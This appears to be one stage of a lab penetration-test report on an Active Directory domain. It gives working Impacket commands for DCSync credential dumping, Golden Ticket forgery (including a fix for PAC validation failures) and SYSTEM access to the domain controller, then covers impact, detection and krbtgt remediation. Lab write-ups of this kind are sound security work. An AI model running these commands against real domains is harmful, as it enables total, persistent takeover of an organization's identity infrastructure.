# Domain-Level Compromise

## Objective

Demonstrate full, persistent domain-level compromise by extracting the domain's core Kerberos trust material and using it to forge authentication that grants Domain Administrator–equivalent access independent of any single account's actual password.

## Preconditions

- Administrative-level access to the Domain Controller (established during Lateral Movement).
- Directory replication rights sufficient to perform a DCSync-style credential extraction, available to the compromised privileged account context in use at this stage.

## Attack Execution

### Step 1 — DCSync: Extract Domain-Wide Credential Material (Kali)

Using the administrative session/credentials established on the Domain Controller, a directory replication request was performed to extract password material for domain accounts, including the `krbtgt` account — the account whose key material underpins the validity of all Kerberos tickets issued within the domain (MITRE ATT&CK T1003.006 — OS Credential Dumping: DCSync):

```bash
secretsdump.py -just-dc LAB.local/Administrator@[INSERT DC IP] -hashes :[INSERT NT HASH]
```

This returns NTLM hash material for every account in the domain, including `krbtgt`. The `krbtgt` hash was recorded for the next step.

Domain SID was also captured:

```bash
lookupsid.py LAB.local/Administrator@[INSERT DC IP] -hashes :[INSERT NT HASH]
```

### Step 2 — Golden Ticket Forgery (Kali)

**Initial attempt (failed):**

```bash
ticketer.py -nthash [INSERT KRBTGT NT HASH] -domain-sid [INSERT DOMAIN SID] -domain LAB.local fakeadmin
```

Attempting to use this ticket resulted in:

```
[-] Kerberos SessionError: KDC_ERR_TGT_REVOKED(TGT has been revoked)
```

**Root cause investigation:**

1. Checked for clock skew between Kali and the Domain Controller (Kerberos requires close time synchronization):

   ```powershell
   # On the Domain Controller
   Get-Date
   ```

   ```bash
   # On Kali — set to match the DC's reported time
   sudo date -s "2026-08-07 11:41:53"
   ```

2. Re-ran DCSync to rule out a stale/rotated `krbtgt` hash and confirmed the current key material.

3. Identified the actual root cause: the Domain Controller performs **PAC (Privilege Attribute Certificate) validation** against real AD database objects. A ticket forged for a non-existent account (`fakeadmin`) fails this validation and is revoked, because modern Windows Server hardening cross-checks the PAC's claimed identity and group memberships against an actual object in the directory.

**Corrected ticket forgery** — using a real, existing domain account and its correct Relative Identifier (RID) instead of a fabricated username:

```bash
ticketer.py -nthash [INSERT KRBTGT NT HASH] -domain-sid [INSERT DOMAIN SID] -domain LAB.local -user-id 500 Administrator
```

(RID `500` is the well-known, fixed RID of the built-in `Administrator` account; for a different target account, the actual RID must be sourced from `secretsdump.py` output.)

### Step 3 — Authenticate Using the Forged Ticket (Kali)

```bash
export KRB5CCNAME=administrator.ccache
psexec.py -k -no-pass LAB.local/Administrator@WIN-DC.LAB.local
```

```
C:\Windows\system32> whoami
nt authority\system
```

### Step 4 — Persistence Validation

To confirm the forged ticket's independence from any single account's live password, the real `Administrator` account's password was reset:

```powershell
Set-ADAccountPassword Administrator -Reset -NewPassword (ConvertTo-SecureString "[INSERT NEW PASSWORD]" -AsPlainText -Force)
```

The same golden ticket (`administrator.ccache`) was reused, and authentication to the Domain Controller **continued to succeed** — confirming the forged ticket's validity was tied to the `krbtgt` key material, not the target account's actual password.

## Attack Path

```
Initial Access
  → Local Privilege Escalation
    → Credential Access
      → Lateral Movement
        → Active Directory Exploitation
          → Domain-Level Privileged Access (this stage)
```

## Evidence

[`evidence/impacket.png`](../evidence/impacket-image.png)


## Impact

Domain-level compromise of this kind represents total loss of control over the organization's identity infrastructure. An attacker at this stage can impersonate any user, access any resource protected by domain authentication, extract any account's credential material at will, and — critically — retain this level of access even after standard incident-response actions such as password resets, unless the `krbtgt` account itself is specifically and correctly remediated (see below).

## Attack Chain Summary

| Stage | Target | Technique | Result |
|---|---|---|---|
| Initial Access | Windows 11 workstation | Simulated phishing / user execution (`msfvenom` + `multi/handler`) | Standard domain user session |
| Privilege Escalation | Windows 11 workstation | `AlwaysInstallElevated` misconfiguration | SYSTEM-level session |
| Credential Access | Windows 11 workstation | LSASS memory extraction (offline dump + `pypykatz`, after live Mimikatz/`kiwi` was blocked) | Domain Administrator NTLM hash |
| Lateral Movement | Domain Controller | Pass-the-Hash (NetExec validation + `psexec.py`) | SYSTEM-level session on Domain Controller |
| AD Exploitation | Domain Controller | Kerberoasting (`GetUserSPNs.py`), AS-REP Roasting (`GetNPUsers.py`) | Plaintext passwords for `SQLService` and `j.smith` |
| Domain Compromise | Domain Controller | DCSync (`secretsdump.py`) + forged Golden Ticket (`ticketer.py`) | Persistent Domain Administrator–equivalent access, survives password reset |

## Defensive Significance

Compromise of a privileged domain identity — and particularly of the `krbtgt` account's key material — is among the most severe outcomes possible in an Active Directory environment, because it undermines the fundamental trust mechanism the entire domain relies on. Remediation at this stage requires more than a routine password reset: Microsoft-recommended guidance requires resetting the `krbtgt` account's password **twice in sequence** to fully invalidate any forged tickets, alongside a full review of all privileged account activity and directory replication permissions. This stage exists in the report specifically to demonstrate why every preceding finding — even ones that appear individually minor — must be treated as a priority, since together they form a complete path to this outcome.

## Remediation

- Reset the `krbtgt` account password twice in sequence (per Microsoft guidance) following any suspected domain compromise of this severity, to invalidate all previously issued and forged tickets.
- Restrict directory replication permissions (`Replicating Directory Changes` / `Replicating Directory Changes All`) to Domain Controllers and a minimal, tightly controlled set of Tier-0 administrative accounts.
- Monitor for anomalous directory replication requests originating from non-Domain-Controller hosts (a DCSync indicator).
- Monitor for Kerberos tickets with anomalous lifetimes, unusual PAC contents, or requests inconsistent with normal user behavior (Golden Ticket indicators).
- Maintain a documented, tested incident response plan specifically for suspected `krbtgt`/domain-trust compromise, distinct from standard account-compromise response procedures.
